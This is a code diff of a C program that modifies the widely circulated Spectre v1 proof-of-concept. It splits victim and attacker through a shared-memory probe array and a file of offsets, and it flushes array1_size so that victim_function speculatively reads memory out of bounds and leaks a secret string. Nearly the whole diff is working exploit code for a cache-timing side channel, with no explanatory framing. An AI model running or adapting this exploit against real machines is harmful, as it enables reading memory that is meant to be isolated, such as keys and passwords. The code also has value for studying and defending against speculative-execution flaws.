@@ -19,6 +19,7 @@ Victim code.
 int fd_lock;
 
 unsigned int array1_size = 16;
+uint8_t flushc[6000000];
 uint8_t unused1[64];
 uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
 uint8_t unused2[64]; 
@@ -26,7 +27,7 @@ uint8_t *array2;
 
 char *secret = "The Magic Words are Squeamish Ossifrage.";
 const char *lock_file_name = "spectre.lock";
-const char *shared_name = "shared_file";
+const char *shared_memory_name = "shared_mem";
 const char *index_file_name = "index.txt";
 
 void victim_function(size_t x) {
@@ -43,7 +44,7 @@ Analysis code
 #define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x) {
+void readMemoryByte() {
 	/* static int results[256]; */
 	/* int tries, i, j, k, mix_i; */
 	/* unsigned junk = 0; */
@@ -79,6 +80,7 @@ void readMemoryByte(size_t malicious_x) {
 
 	// acquire lock
 	static int offset, locked;
+	static size_t buffer[64], buffer_size = 64;
 
 	// wait to appear
 	while (access(index_file_name, F_OK) == -1);
@@ -95,10 +97,17 @@ void readMemoryByte(size_t malicious_x) {
 		exit(0);
 	}
 
-	fscanf(f, "%d", &offset);
-	_mm_clflush(&array1_size);
-	for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
-	victim_function(malicious_x + offset);
+	int no_items;
+	fscanf(f, "%d", &no_items);
+	for (int i = 0; i < no_items; ++i) {
+		fscanf(f, "%zu", &buffer[i]);
+	}
+
+	for (int i = 0; i < no_items; ++i) {
+		_mm_clflush(&array1_size);
+		for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
+		victim_function(buffer[i]);
+	}
 
 	fclose(f);
 	// remove file
@@ -111,34 +120,32 @@ void readMemoryByte(size_t malicious_x) {
 }
 
 int main(int argc, const char **argv) {
-	int fd = open(shared_name, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
+	// map shared_file
+	int fd = open(shared_memory_name, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
 	array2 = (uint8_t*)mmap(NULL, 256 * 512, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	close(fd);
 
 	if (array2 == MAP_FAILED) {
-		printf("map failed %d >< %d\n", errno, EBADF);
+		printf("map failed %d", errno);
 		return 0;
 	}
 
-	size_t malicious_x = (size_t)(secret - (char*)array1);   /* default for malicious_x */
+	// output offset to secret for easiness
+	size_t offset_to_secret = (size_t)(secret - (char*)array1);   /* default for malicious_x */
+	printf("%zu\n", offset_to_secret);
+
 	int i, score[2], offset;
 	uint8_t value[2];
 
-	for (i = 0; i < sizeof(array2); i++)
-		array2[i] = 1;    /* write to array2 so in RAM not copy-on-write zero pages */
+	/* if (argc == 2) { */
+	/* 	sscanf(argv[1], "%d", &offset); */
+	/* 	printf("given offset: %d\n", offset); */
+	/* } else { */
+	/* 	printf("Required argument: offset"); */
+	/* 	return 0; */
+	/* } */
 
-	if (argc == 2) {
-		sscanf(argv[1], "%d", &offset);
-		printf("given offset: %d\n", offset);
-	} else {
-		printf("Required argument: offset");
-		return 0;
-	}
-
-	/* readMemoryByte(malicious_x + offset); */
-	while (1) {
-		readMemoryByte(malicious_x);
-	}
+	while (1) readMemoryByte();
 
 	return 0;
 }
